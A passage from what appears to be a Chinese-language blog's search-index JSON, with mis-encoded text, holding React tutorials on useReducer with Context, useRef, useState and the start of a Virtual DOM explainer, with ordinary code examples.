Reduxï¼Œä½†åˆæƒ³è¦å…¨åŸŸ stateã€çš„æ™‚å€™ã€‚å¯ä»¥åˆ©ç”¨å®ƒä¾†è·Ÿ Context çµåˆå‡ºä¸€å€‹æ›¿ä»£æ–¹æ¡ˆã€‚ æ‰€ä»¥çœ‹é€™ç¯‡å‰æœ€å¥½å…ˆçŸ¥é“ä¸€ä¸‹ useContext åœ¨å¹¹å˜›ï¼Ÿå› ç‚ºç­‰ä¸€ä¸‹çš„ç¯„ä¾‹æœƒç”¨åˆ°ï¼Œå»ºè­°å¯ä»¥å…ˆå»çœ‹æˆ‘ä¹‹å‰å¯«çš„é€™å…©ç¯‡ï¼š React çš„ç¬¬å…«å€‹ hookï¼šuseContext èˆ‡ createContext Reactï¼é—œæ–¼ useContext æ›´å¥½çš„å¯«æ³• useReducer çš„å¥½ç”¨ä¹‹è™•ï¼Ÿã€Œåœ¨å­¸ä»»ä½•æ±è¥¿å‰ï¼Œå…ˆå•ä¸€ä¸‹ç‚ºä»€éº¼è¦ç”¨é€™å€‹æ±è¥¿ï¼Ÿã€æ˜¯å¥å¾ˆç¶“å…¸çš„è©±ï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆä¾†èˆ‰ä¸€å€‹ç¯„ä¾‹ï¼Œä¸€é–‹å§‹ä¸ä½¿ç”¨ useReducer æ¥è‘—å†ä¾†è§£é‡‹å¦‚æœç”¨äº† useReducer èƒ½å¸¶ä¾†ä»€éº¼å¥½è™•ï¼Ÿ å‡è¨­æˆ‘å€‘ç›®å‰è¦åšä¸€å€‹å¯ä»¥åˆ‡æ›ã€Œé¡è‰²ä¸»é¡Œã€çš„ç¶²é ï¼Œåº•ä¸‹çš„å…ƒä»¶å¾—æ ¹æ“šç›®å‰çš„ä¸»é¡Œä¾†åˆ‡æ›æ¨£å¼ï¼Œæ‰€ä»¥é™¤äº†éœ€è¦ state ä»¥å¤–ï¼Œæˆ‘å€‘é‚„éœ€è¦ä¸€å€‹ Context ä¾†é¿å…ã€ŒProps drillingã€çš„å•é¡Œã€‚ æ‰€ä»¥å‘¢ï¼Œç›®å‰å¤§æ¦‚æœƒæœ‰é€™æ¨£çš„ codeï¼š ThemeContext.jsx 12345678910111213141516import { createContext } from 'react'// å­˜å– context æ™‚é‚„æ˜¯å¾—é€éä»–ï¼Œæ‰€ä»¥è¦ export å‡ºå»export const ThemeContext = createContext()// å»ºç«‹ä¸€å€‹å…ƒä»¶åŒ…è£å¾Œå† export å‡ºå»export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'dodgerblue' }) return ( &lt;ThemeContext.Provider value={{theme, setTheme}}&gt; {children} &lt;/ThemeContext.Provider&gt; )} é€™å€‹æ˜¯åœ¨ Reactï¼é—œæ–¼ useContext æ›´å¥½çš„å¯«æ³• ä¸­æåˆ°çš„å°æŠ€å·§ï¼Œå¿˜è¨˜çš„è©±å¯ä»¥å»è¤‡ç¿’ä¸€ä¸‹ã€‚ App.js 1234567891011import Nav from \"./Nav\";import \"./styles.css\";import { ThemeProvider } from \"./ThemeContext\";export default function App() { return ( &lt;ThemeProvider&gt; &lt;Nav /&gt; &lt;/ThemeProvider&gt; );} æ¥è‘—ï¼Œå‡è¨­æˆ‘å€‘æƒ³é€éå°è¦½åˆ—ä¸Šçš„æŒ‰éˆ•ä¾†åˆ‡æ›é¡è‰²ï¼Œå¯èƒ½å°±æœƒå¯«å‡ºé€™æ¨£çš„æ±è¥¿ï¼š 12345678910111213141516import { useContext } from \"react\";import { ThemeContext } from \"./ThemeContext\";export default function Nav() { const { theme, setTheme } = useContext(ThemeContext); const changeTheme = () =&gt; setTheme((prevTheme) =&gt; ({ ...prevTheme, color: \"pink\" })); return ( &lt;div className=\"nav\" style={{ background: theme.color }}&gt; &lt;h1&gt;Peanu&lt;/h1&gt; &lt;button onClick={changeTheme}&gt;Change Theme&lt;/button&gt; &lt;/div&gt; ); åšåˆ°é€™é‚Šæœ‰ä»»ä½•ç–‘å•çš„è©±å¯ä»¥å…ˆä¾†é€™é‚Šçœ‹ä¸€ä¸‹ç¯„ä¾‹ï¼Œå¸Œæœ›èƒ½å¹«åŠ©ä½ ç†è§£ä¸€é»ã€‚ ç¸½ä¹‹å‘¢ï¼Œä¸€å€‹æœ€ç°¡å–®çš„ Context å°±é€™æ¨£å®Œæˆäº†ï¼Œä½†å¦‚æœä½ ä»”ç´°æƒ³ä¸€ä¸‹æœƒç™¼ç¾å…¶å¯¦æœ‰å¯ä»¥æ”¹å–„çš„ç©ºé–“ï¼š 1. é‚è¼¯å…¨éƒ¨å¡åœ¨ function è£¡æˆ‘çŸ¥é“é€™è½èµ·ä¾†æœ‰é»å¥‡æ€ªï¼Œç•¢ç«Ÿåœ¨ function æ”¾é‚è¼¯ä¸æ˜¯å¤©ç¶“åœ°ç¾©çš„äº‹å—ï¼Ÿä¸ç„¶è¦æ”¾åœ¨å“ªè£¡ï¼Ÿ åˆ¥æ€¥ï¼Œæˆ‘çš„æ„æ€æ˜¯æŒ‡å‰›å‰›æˆ‘å€‘ç›´æ¥åœ¨ changeTheme ä¸­ç”¨ setTheme çš„é€™ç¨®æ–¹å¼å…¶å¯¦æ‡‰è©²æœ‰æ›´å¥½çš„å¯«æ³•ï¼Œç•¢ç«Ÿç•¶é‚è¼¯è®Šå¾—è¤‡é›œæ™‚è£¡é¢çš„æ±è¥¿ä¹Ÿæœƒè¶Šä¾†è¶Šå¤šï¼Œå¯è®€æ€§å°±æœƒæ²’é‚£éº¼å¥½ã€‚ é€™å€‹æ™‚å€™å¦‚æœæˆ‘å€‘å¯ä»¥é€é dispatch çš„æ¦‚å¿µä¾†æ”¹å¯«çš„è©±ï¼Œä¸æ˜¯æœƒå¥½å¾ˆå¤šå—ï¼Ÿåƒé€™æ¨£ï¼š 123456function changeTheme () { dispatch({ type: 'CHANGE_COLOR', payload: 'pink' })} 2. state / function é›¶æ•£å„åœ°æ„æ€æ˜¯ç•¶ ThemeContext æƒ³å»ºç«‹å…¶ä»–çš„ state æ™‚ï¼Œstate å°±æœƒè¶Šä¾†è¶Šå¤šå€‹ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718192021222324import { createContext } from 'react'// å­˜å– context æ™‚é‚„æ˜¯å¾—é€éä»–ï¼Œæ‰€ä»¥è¦ export å‡ºå»export const ThemeContext = createContext()// å»ºç«‹ä¸€å€‹å…ƒä»¶åŒ…è£å¾Œå† export å‡ºå»export function ThemeProvider ({ children }) { const [theme, setTheme] = useState({ color: 'dodgerblue' }) // å…¶ä»–çš„ state const [state2, setState2] = useState() const [state3, setState3] = useState() return ( &lt;ThemeContext.Provider value={{ theme, setTheme, state2, state3 }}&gt; {children} &lt;/ThemeContext.Provider&gt; )} æ‰€ä»¥å‘¢ï¼Œé€™æ™‚å€™å¦‚æœæ”¹ç”¨ useReducer çš„è©±å°±å¯ä»¥æ”¹å–„é€™äº›å•é¡Œã€‚ åŠ å…¥ useReduceré€™é‚Šå…ˆä»‹ç´¹ä¸€ä¸‹ useReducer çš„ç”¨æ³•ï¼Œå…¶å¯¦å°±è·Ÿåœ¨å¯« redux å·®ä¸å¤šï¼Œæ‰€ä»¥å¦‚æœä½ å° redux å®Œå…¨æ²’æ¦‚å¿µçš„è©±å»ºè­°å…ˆå»è£œä¸€äº›ç›¸é—œçŸ¥è­˜å†å›ä¾†çœ‹ï¼Œé€™é‚Šä¸æœƒè§£é‡‹å¤ªæ·±ã€‚ ç¸½ä¹‹æ ¸å¿ƒè¦ç´ é‚„æ˜¯å¹¾å€‹æ±è¥¿ï¼š reducer action dispatch é¦–å…ˆ useReducer æœƒæ¥æ”¶å…©å€‹åƒæ•¸ï¼Œåˆ†åˆ¥ç‚º initialState è·Ÿ reducerã€‚ initialState å°±æ˜¯åˆå§‹çš„ stateï¼Œreducer å‰‡æ˜¯ç”¨ä¾†è™•ç†æ¯å€‹ action çš„ functionã€‚ æ‰€ä»¥å¼·èª¿ä¸€ä¸‹ï¼š reducer å°±åªæ˜¯ä¸€å€‹ function reducer å°±åªæ˜¯ä¸€å€‹ function reducer å°±åªæ˜¯ä¸€å€‹ function æ¥è‘— useReducer æœƒå›å‚³å…©å€‹å€¼ï¼ˆåŒ…åœ¨ Array è£¡ï¼‰ï¼Œåˆ†åˆ¥ç‚º state è·Ÿ dispatchï¼Œå‰è€…å°±æ˜¯ state çš„å€¼ï¼Œå¾Œè€…å‰‡æ˜¯ç”¨ä¾†ç™¼å‡º action çš„ä¸€å€‹ functionã€‚ å…¶å¯¦é€™å¹¾å€‹æ±è¥¿éƒ½æ˜¯ redux çš„æ ¸å¿ƒè¦ç´ ï¼Œæ‰€ä»¥å†æ¬¡å»ºè­°ä½ å…ˆå»ç†è§£ redux çš„æ¦‚å¿µå¾Œå†å›ä¾†çœ‹é€™ç¯‡ï¼Œä¸ç„¶æ‡‰è©²å¾ˆé›£ç†è§£ã€‚ æ‰€ä»¥å›åˆ°å‰›å‰›çš„ä¾‹å­ï¼Œæˆ‘å€‘æœƒæŠŠ useState æ‹¿æ‰ï¼Œæ”¹ç”¨ useReducer ä¾†å–ä»£ï¼Œè®Šæˆé€™æ¨£å­ï¼š 12345678910111213141516171819202122232425262728293031323334353637import { createContext, useReducer } from \"react\";export const ThemeContext = createContext();// initialStateconst initState = { color: \"dodgerblue\"};// reducerconst themeReducer = (state, action) =&gt; { switch (action.type) { case \"CHANGE_THEME\": return { ...state, color: action.payload }; default: return state; }};export function ThemeProvider({ children }) { // æ”¹ç”¨ useReducer å–ä»£ useState const [state, dispatch] = useReducer(themeReducer, initState); // ç”¨ä¾†æ”¹è®Š state çš„ function const changeTheme = (color) =&gt; { dispatch({ type: \"CHANGE_THEME\", payload: color }); }; // æœ€å¾ŒæŠŠ state è·Ÿ changeTheme ç•¶ä½œ Provider çš„å€¼ return ( &lt;ThemeContext.Provider value={{ state, changeTheme }}&gt; {children} &lt;/ThemeContext.Provider&gt; );} æœ€å¾Œå®Œæˆçš„ ç¯„ä¾‹ åœ¨é€™é‚Šï¼Œæœ‰ä»€éº¼ç–‘å•çš„è©±å¯ä»¥å»ç©ç©çœ‹ã€‚ å›é¡§ä¸€ä¸‹å‰›å‰›æåˆ°çš„å…©å€‹å•é¡Œï¼Œé€™é‚Šæ”¹ç”¨ useReducer å¾Œå…¶å¯¦å°±éƒ½è§£æ±ºäº†ï¼š 1. é‚è¼¯éƒ½å¯«åœ¨ function è£¡ ç¾åœ¨ function è¦åšçš„äº‹æƒ…å¾ˆå–®ç´”ï¼Œå°±æ˜¯ dispatch ä¸€å€‹ action çµ¦ reducerï¼Œåƒ…æ­¤è€Œå·²ã€‚ 2. éœ€è¦å¾ˆå¤šä¸åŒçš„ state ä¾†ç®¡ç†ä¸åŒç‹€æ…‹ ç•¶æ”¹ç”¨ useReducer å¾Œï¼Œæˆ‘å€‘å¯ä»¥æŠŠæ‰€æœ‰ state æ”¾åœ¨ä¸€å€‹ Object ç®¡ç†å°±å¥½ï¼Œä¸éœ€è¦å†æ‹†æˆä¸€å€‹ä¸€å€‹ã€‚ æ‰€ä»¥ä»¥ä¸Šå°±æ˜¯ useReducer çš„ç¯„ä¾‹ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½é‹ç”¨é€™å€‹è¼•é‡å‹çš„ hook ä¾†å¯¦ç¾ç°¡å–®çš„ç‹€æ…‹ç®¡ç†ã€‚","link":"/2022/06/20/react-use-reducer/"},{"title":"React çš„ç¬¬äºŒå€‹ hookï¼šuseRef","text":"å†ä¾†ä¸€å€‹ã€‚ æ‡¶äººåŒ…ä»¥ä¸‹æ˜¯å¹¾å€‹å¾ˆé‡è¦çš„ç‰¹æ€§ï¼š å›å‚³å€¼æ˜¯ä¸€å€‹æœ‰ current å±¬æ€§çš„ Object æ›´æ–° current å€¼ä¸æœƒè§¸ç™¼ re-render re-render çš„æ™‚å¾Œä¸æœƒè¢«é‡æ–°è³¦å€¼ é€™äº›æ˜¯æˆ‘è¦ºå¾—æœ€é‡è¦çš„å¹¾é»ï¼Œè«‹å‹™å¿…å¼„æ¸…æ¥šã€‚ ç”¨ä¾†å­˜å– Uncontrolled Componenté€šå¸¸æ˜¯ç”¨åœ¨ Uncontrolled Componentï¼ˆæ²’æœ‰ state çš„ Componentï¼‰ ä¸Šï¼Œä¸éé€™é‚Šç‚ºäº†æ–¹ä¾¿æœƒç›´æ¥æ‹¿ &lt;input&gt; ä¾†èˆ‰ä¾‹ï¼ˆå¯¦å‹™ä¸Šé€šå¸¸æœƒæŠŠ &lt;input&gt; ç•¶æˆ controlled Componentï¼‰ï¼š 1234567891011121314151617181920import { useRef } from 'react'function TodoHeader () { // ä½¿ç”¨é€™å€‹ hook const inputRef = useRef() const handleInput = (e) =&gt; { // è¦é€é current æ‰èƒ½å­˜å–åˆ°ï¼ˆå› ç‚º pass-by-reference çš„å•é¡Œï¼‰ console.log(inputRef.current.value) } return ( &lt;TodoHeaderWrapper onSubmit={handleSubmit}&gt; &lt;TodoInputBlock&gt; // åœ¨é€™è£¡å‚³å…¥ ref é€™å€‹ props &lt;Input ref={inputRef} value={value} onChange={handleInput}&gt;&lt;/Input&gt; &lt;BlueButton&gt;é€å‡º&lt;/BlueButton&gt; &lt;/TodoInputBlock&gt; &lt;/TodoHeaderWrapper&gt; )} ä¸€é–‹å§‹çš„ inputRef æ‡‰è©²æœƒæ˜¯ä¸€å€‹ç©ºç‰©ä»¶ {current: null}ï¼ˆæˆ‘çŒœçš„å•¦ï¼‰ï¼Œæ¥è‘—ç•¶ä½ æŠŠå®ƒç•¶ä½œ props çµ¦ Component çš„æ™‚å€™å°±æœƒè¢«è®Šæˆé‚£å€‹ DOM å…ƒç´ ã€‚ æ‰€ä»¥ä½ æ‰èƒ½åœ¨å…¶ä»– function ä¸­é€é inputRef ä¾†æŠ“åˆ°å°æ‡‰çš„ DOM å…ƒç´ ã€‚ ä¸å¸Œæœ› re-render å¾Œè¢«é‡æ–°è³¦å€¼æœ‰æ™‚å€™æ²’æ³¨æ„å¥½çš„è©±å¯èƒ½å°±æœƒçŠ¯é€™ç¨®éŒ¯ï¼š 123456789101112131415function App () { // å®£å‘Šä¸€å€‹ id let id = 1; // ç‚ºäº†è§¸ç™¼ re-render è€Œé–‹çš„ state const [myState,setMyState] = useState(0) return ( &lt;div&gt;id: {id}&lt;/div&gt; &lt;div&gt;myState: {myState}&lt;/div&gt; // é»æŒ‰éˆ•æ™‚å°±æ›´æ–° stateï¼Œä¸¦æŠŠ id++ &lt;button onClick={() =&gt; { setMyState(myState + 1) id++ }}&gt;Increment id&lt;/button&gt; )} é€™é‚Šç¢°åˆ°çš„å•é¡Œæ˜¯æ€éº¼ id++ æ²’ç”¨ï¼Ÿ åŸä¾†æ˜¯å› ç‚ºæ¯æ¬¡ re-render çš„æ™‚å€™åˆæœƒåŸ·è¡Œåˆ° let id = 1 é€™æ®µï¼Œé€™æ¨£å°±ç­‰æ–¼åˆé‡æ–°è³¦å€¼äº†ï¼Œæ‰€ä»¥çµæœé‚„æ˜¯æœƒé¡¯ç¤º 1ï¼Œè€Œä¸æ˜¯éå¢å¾Œçš„å€¼ã€‚ è¦è§£æ±ºé€™å€‹å•é¡Œæœ‰å…©ç¨®åšæ³•ï¼Œä¸€ç¨®æ˜¯æŠŠ let id = 1 å®£å‘Šåœ¨ Component çš„å¤–é¢ï¼Œé€™æ¨£ re-render æ™‚å°±ä¸æœƒé‡æ–°å®£å‘Šä¸€æ¬¡ã€‚ å¦ä¸€ç¨®ä½œæ³•æ˜¯ç”¨ useRef ä¾†è™•ç†ï¼š 1234567891011121314function App () { const id = useRef(1); // { current : 1 } // ç‚ºäº†è§¸ç™¼ re-render è€Œé–‹çš„ state const [myState,setMyState] = useState(0) return ( &lt;div&gt;id: {id.current}&lt;/div&gt; &lt;div&gt;myState: {myState}&lt;/div&gt; // é»æŒ‰éˆ•æ™‚å°±æ›´æ–° stateï¼Œä¸¦æŠŠ id++ &lt;button onClick={() =&gt; { setMyState(myState + 1) id.current++ }}&gt;Increment id&lt;/button&gt; )} é›–ç„¶ re-render çš„æ™‚å€™çœ‹èµ·ä¾†å¥½åƒæœƒå†åŸ·è¡Œä¸€æ¬¡ const id = useRef(1)ï¼Œä¸é useRef çš„ç‰¹æ€§å°±æ˜¯æœƒæŠŠå€¼çµ¦ä¿ç•™èµ·ä¾†ï¼Œæ‰€ä»¥å¯¦éš›ä¸Šæ˜¯ä¸æœƒè¢«é‡æ–°è³¦å€¼çš„ã€‚ åªæœ‰åƒ id.current++ é€™ç¨®ã€Œè‡ªå·±å»æ”¹è®Šæ•¸å€¼ã€çš„æƒ…æ³ä¸‹å®ƒçš„å€¼æ‰æœƒæ”¹è®Šã€‚ æ‰€ä»¥ useRef å°±æœ‰é»åƒæ˜¯ useEffect çš„é¡›å€’éä¾†ã€‚ä¸€å€‹ä¸èƒ½ç›´æ¥æ”¹å€¼ï¼Œä¸€å€‹å¯ä»¥ï¼›è€Œä¸€å€‹åœ¨æ”¹å€¼å¾Œæœƒ re-renderï¼Œ ä¸€å€‹ä¸æœƒã€‚","link":"/2022/04/06/react-use-ref/"},{"title":"React çš„ç¬¬ä¸€å€‹ hookï¼šuseState","text":"æ˜¯ç¬¬ä¸€å€‹ä¹Ÿæ˜¯æœ€ç¶“å…¸çš„ï¼Ÿ åŸºæœ¬ç”¨æ³•1234567function Counter() { const [value, setValue] = useState(1) const handleClick = () =&gt; setValue(value + 1) return &lt;button onClick={handleClick}&gt;{value}&lt;/button&gt;}ReactDOM.render(&lt;Counter /&gt;, document.getElementById('root')) useState() çš„å›å‚³å€¼æ˜¯ä¸€å€‹ Arrayï¼Œç¬¬ä¸€å€‹å€¼æ˜¯åˆå§‹å€¼ï¼Œç¬¬äºŒå€¼æ˜¯ä¸€å€‹ functionï¼Œç•¶æ›´æ–° state æ™‚å°±æœƒé€éå®ƒä¾†æ›´æ–°ã€‚ å¦å¤–è¦ç‰¹åˆ¥æ³¨æ„ï¼ŒuseState()ï¼ˆhookï¼‰åªèƒ½å¯«åœ¨ component è£¡é¢ï¼Œå¯«åœ¨å¤–é¢æœƒå‡ºéŒ¯ã€‚ æ¥è‘—åœ¨è¬›ä¸‹é¢çš„æ±è¥¿ä¹‹å‰ï¼Œå…ˆè¨˜ä½é€™å¼µåœ–ï¼Œç­‰ä¸€ä¸‹æœƒç”¨åˆ°ï¼š ï¼ˆNotes ä¹Ÿç¨å¾®çœ‹ä¸€ä¸‹ï¼Œå®ƒæœ‰è§£é‡‹ä»€éº¼æ˜¯ Update å’Œ Lazy Initializersï¼‰ åˆå§‹å€¼å¯ä»¥å‚³ä¸€å€‹ functionï¼šLazy Initializersæ‹¿ todo list ä¾†èˆ‰ä¾‹ï¼Œå‡è¨­æˆ‘æƒ³æŠŠåˆå§‹å€¼è¨­ç‚º localStorage ä¸­çš„å…§å®¹ï¼Œå¯èƒ½æœƒé€™æ¨£å¯«ï¼š 1234// æ²’å€¼çš„è©±æœƒæ˜¯ nullconst todoData = window.localStorage.getItem('todos')// null || []const [todos, setTodos] = useState(JSON.parse(todoData) || []) é€™æ¨£å­åšçš„çµæœæ˜¯ OK çš„ï¼Œä¸éæœ‰ä¸€å€‹å•é¡Œæ˜¯æ¯æ¬¡ render çš„æ™‚å€™éƒ½æœƒå†è·‘ä¸€æ¬¡ window.localStorage.getItem(\"todos\") é€™æ®µã€‚ ç°¡å–®ä¾†èªªï¼Œé€™æœƒé€ æˆæ•ˆèƒ½ä¸Šçš„æµªè²»ï¼Œå› ç‚º useState çš„åˆå§‹å€¼ä¸¦ä¸æœƒå› ç‚ºä¸‹æ¬¡ window.localStorage.getItem(\"todos\") æŠ“åˆ°çš„å€¼æ”¹è®Šè€Œé‡æ–°è¨­å®šä¸€æ¬¡åˆå§‹å€¼ï¼Œå®ƒåªæœ‰åœ¨ç¬¬ä¸€æ¬¡è¼‰å…¥æ™‚æ‰æœƒåŸ·è¡Œä¸€æ¬¡è€Œå·²ã€‚ æ‰€ä»¥ã€Œå¦‚æœåˆå§‹å€¼æ˜¯éœ€è¦ç¶“éè¨ˆç®—çš„å€¼ã€ï¼Œå¯ä»¥ç›´æ¥åœ¨ useState ä¸­æ”¹å‚³ä¸€å€‹ functionï¼Œåƒé€™æ¨£ï¼š 1234567891011// å‚³ä¸€å€‹ function é€²å»const [todos, setTodos] = useState(() =&gt; { let todoData = window.localStorage.getItem('todos') if (todoData &amp;&amp; todoData !== '[]') { todoData = JSON.parse(todoData) id = todoData[0].id + 1 } else { todoData = [] } return todoData}) é€™ç¨®ä½œæ³•åœ¨æŠ€è¡“ä¸Šæœƒç¨±ç‚ºã€ŒLazy Initializersã€ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œé€™æ¨£åšä»¥å¾Œå°±ä¸æœƒå‡ºç¾æ¯æ¬¡ render åˆé‡è¤‡åŸ·è¡Œçš„å•é¡Œã€‚ï¼ˆæˆ–ä¹Ÿå¯ä»¥èªªæ˜¯é™ä½ side effect å§ï¼Ÿè½èµ·ä¾†æ¯”è¼ƒå°ˆæ¥­çš„èªªæ³•ï¼‰ ç•¶åœ¨ function è£¡é¢å›å‚³å¦ä¸€å€‹ functionï¼šCleanup Effectsåœ¨ç”¨ useEffect ä¸­ä½¿ç”¨ function ä¾†è¨­å®šåˆå§‹å€¼çš„æ™‚å€™ï¼Œå…¶å¯¦è£¡é¢é‚„å¯ä»¥åœ¨å›å‚³ä¸€å€‹ functionï¼Œé€™å€‹ function æœƒæ˜¯ã€ŒCleanup Effectsã€éšæ®µçš„ hookï¼š 12345678910// æ›´æ–° localStorageuseEffect(() =&gt; { console.log('Effect todos', todos) window.localStorage.setItem('todos', JSON.stringify(todos)) // å›å‚³å¦ä¸€å€‹ function return () =&gt; { // é€™è£¡æœƒæ‹¿åˆ°ä¸Šä¸€å€‹ todos çš„å€¼ console.log('Clean Effect todos', todos) }}, [todos]) é€™å€‹ Cleanup Effects hook æœƒåœ¨ä¸‹ä¸€æ¬¡åŸ·è¡Œ useEffect ä¹‹å‰å…ˆè¢«åŸ·è¡Œï¼Œå°±è·Ÿä¸€é–‹å§‹é‚£å¼µåœ–è£¡ç•«çš„ä¸€æ¨£ã€‚è€Œä¸”ç‰¹åˆ¥çš„åœ°æ–¹æ˜¯å®ƒèƒ½æ‹¿åˆ°ä¸Šä¸€å€‹ state çš„å€¼ï¼Œåƒè€ƒä¸‹åœ–ï¼š è§£èªªä¸€ä¸‹é€™æµç¨‹ï¼š ç¬¬ä¸€æ¬¡ render å®Œå¾ŒåŸ·è¡Œ useEffectï¼Œå°å‡ºç©ºé™£åˆ— ç¬¬äºŒæ¬¡æ–°å¢äº† todoï¼Œæ”¹è®Šäº† stateï¼Œé‡æ–° render Component render å®Œä»¥å¾Œï¼ŒåŸ·è¡Œ cleanup effectï¼Œé€™è£¡çš„å€¼æœƒæ˜¯ä¸Šä¸€å€‹ effect çš„ stateï¼Œæ‰€ä»¥æœƒå°å‡ºç©ºé™£åˆ— cleanup effect åŸ·è¡Œå®Œå¾Œï¼Œæ¥è‘—æ‰åŸ·è¡Œ useEffectï¼Œå°å‡ºæ–°çš„ todo stateï¼ˆæœ‰ä¸€å€‹ todo çš„å…§å®¹ï¼‰ é€™å€‹ hook å¯èƒ½æœƒç”¨åœ¨ä½ éœ€è¦æ¸…é™¤å‰ä¸€å€‹ç‹€æ…‹çš„æ™‚å€™æœƒç”¨åˆ°ï¼Œä¾‹å¦‚ webSocket ä¹‹é¡çš„ï¼ˆå…ˆåˆªé™¤ä¸Šä¸€ç­†ä½¿ç”¨è€…çš„é€£çµï¼Œæ‰æ¥è‘—å»ºç«‹æ–°çš„é€£çµï¼‰ã€‚ æˆ–è€…æ˜¯å¸Œæœ›åœ¨ unMount ä»¥å‰åšæŸäº›äº‹æƒ…ï¼Œå¤§æ¦‚æœƒåƒé€™æ¨£ï¼š 1234567useEffect(() =&gt; { ... // unMount éšæ®µè¦åšçš„äº‹ return () =&gt; { ... }}, []) é€™å€‹åŸç†æ˜¯å› ç‚ºå‚³å…¥ç©ºå€¼ï¼ˆdependenciesï¼‰çš„useEffect åªæœ‰åœ¨ç¬¬ä¸€æ¬¡è¼‰å…¥çš„æ™‚å€™æœƒè¢«åŸ·è¡Œï¼Œè¦åŸ·è¡Œç¬¬äºŒæ¬¡çš„æ©Ÿæœƒåªæœƒå‡ºç¾åœ¨å…ƒä»¶è¦è¢« unMount çš„æ™‚å€™ï¼Œé€™æ™‚å€™æ‰æœ‰è¾¦æ³•è§¸ç™¼è£¡é¢çš„ cleanup Effectã€‚ å¦‚æœæ–°çš„ state éœ€è¦ç”¨ä¸Šä¸€å€‹ state ä¾†ç®—ï¼Œå¯ä»¥åœ¨ setter å‚³å…¥ functionå¦‚æ¨™é¡Œæ‰€è¿°ï¼Œé€™é‚Šæˆ‘å°±ç›´æ¥å¯«å€‹ç°¡çŸ­çš„ç¯„ä¾‹ï¼š 12345678910const [squares, setSquares] = useState(Array(9).fill(null))const handleClick = () =&gt; { setSquares((prev) =&gt; { // æ‹¿åˆ°ä¸Šä¸€å€‹ state console.log('prev state', prev) // return çš„æ±è¥¿å°±è®Šæˆæ–°çš„ state return [...prev, Math.random()] })};&lt;button onClick={handleClick}&gt;Click&lt;/button&gt; åˆå§‹å€¼æ˜¯è£äº† 9 å€‹ null çš„ç©ºé™£åˆ—ï¼Œæ¯ç•¶é»æŒ‰éˆ•æ™‚å°±åŠ ä¸€ç­†äº‚æ•¸åˆ°å¾Œé¢å»ï¼Œçµæœæœƒåƒé€™æ¨£å­ï¼š ä¸€äº›ä½ å¯èƒ½æœƒçŠ¯çš„éŒ¯èª¤å› ç‚º useState çš„ setter æ˜¯éåŒæ­¥çš„ï¼Œæ‰€ä»¥å¯«å‡ºä¸€äº›éŒ¯èª¤çš„ codeã€‚ 1. æƒ³å–å¾—æ›´æ–°å¾Œçš„å€¼ 1234567891011121314export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) // åœ¨é€™è£¡æ²’è¾¦æ³•æ‹¿åˆ°æ›´æ–°å¾Œçš„å€¼ console.log('after update', testObject) }} å¦‚æœä½ çœŸçš„æƒ³æª¢æŸ¥ï¼Œæ‡‰è©²è¦åˆ©ç”¨ useEffectï¼š 12345678910111213141516export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) } useEffect(() =&gt; { // re-render å®Œä»¥å¾Œæ‰èƒ½ç¢ºä¿ state æ˜¯æœ€æ–°çš„å€¼ console.log('after update', testObject) })} 2. å‘¼å«å¤šæ¬¡ setter 123456789101112131415161718export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { // ç¬¬ä¸€æ¬¡ setTestObject({ ...testObject, weight: 50 }) // ç¬¬äºŒæ¬¡ setTestObject({ ...testObject, gender: 'man' }) }} ä½ å¯èƒ½æœƒé æœŸçµæœè®Šæˆï¼š 123456{ username: 'peanu', age: 20, weight: 50, gender: \"man\"} ä½†çµæœæ˜¯é€™æ¨£å­ï¼š ç°¡å–®ä¾†èªªï¼Œä½ åœ¨è·‘ç¬¬äºŒå€‹ setTestObject çš„æ™‚å€™è£¡é¢çš„ ...testObject é‚„ä¸æ˜¯æ›´æ–°å¾Œçš„å€¼ï¼Œä»£è¡¨ä½ æ˜¯æ‹¿æœ€åŸæœ¬çš„å€¼ä¾†ç”¨ï¼Œæ‰€ä»¥æœ€å¾Œæ‰æœƒåªæœ‰æ–°å¢äº† genderï¼Œä½†å…¶å¯¦èƒŒå¾Œæ˜¯å…©å€‹éƒ½æœ‰åŸ·è¡Œåˆ°çš„ã€‚ å¦‚æœè¦é¿å…é€™å€‹å•é¡Œï¼Œä½ å¯ä»¥æ”¹ç”¨ functional update çš„æ–¹å¼ä¾†åšï¼ˆå°±æ˜¯å‚³å…¥ function å•¦ï¼‰ï¼š 12345678910111213141516export default function App() { const [testObject, setTestObject] = useState({ username: 'peanu', age: 20 }) const handleClick = () =&gt; { setTestObject((prev) =&gt; ({ ...prev, weight: 50 })) setTestObject((prev) =&gt; ({ ...prev, gender: 'man' })) }} é€™æ¨£å°±èƒ½è®Šæˆä½ æƒ³è¦çš„æ¨£å­ã€‚ é›–ç„¶æˆ‘é‚„ä¸å¤ªçŸ¥é“åŸç†æ˜¯ä»€éº¼ï¼Œä½†ç¸½ä¹‹å…ˆé€™æ¨£åšå°±å°äº†ã€‚","link":"/2022/04/06/react-use-state/"},{"title":"ä»€éº¼æ˜¯ Virtual DOMï¼Ÿ","text":"è½èµ·ä¾†å¾ˆå²å®³çš„æ„Ÿè¦ºã€‚ ç°¡è¿°å…ˆèªªé‡é»ï¼š Virtual DOM æœ¬èº«æ˜¯ä¸€å€‹ JavaScript çš„ã€Œç‰©ä»¶ã€ DOM æ˜¯ç€è¦½å™¨æ‰€ç”¢ç”Ÿå‡ºä¾†çš„ã€Œè³‡æ–™çµæ§‹ã€ ä¸è¦æŠŠé€™å…©å€‹æ±è¥¿ææ··äº†ã€‚ æœƒæœ‰ Virtual DOM æ˜¯å› ç‚ºç›´æ¥æ“ä½œ DOM çš„æˆæœ¬å¾ˆé«˜ï¼Œæ‰€ä»¥éœ€è¦é€éå®ƒä¾†è§£æ±ºé€™å€‹å•é¡Œã€‚ ç°¡å–®ä¾†èªªï¼Œæœƒå…ˆæŠŠåŸæœ¬çš„ DOM è¤‡è£½ä¸€ä»½è®Šæˆ Virtual DOMã€‚ Virtual DOM 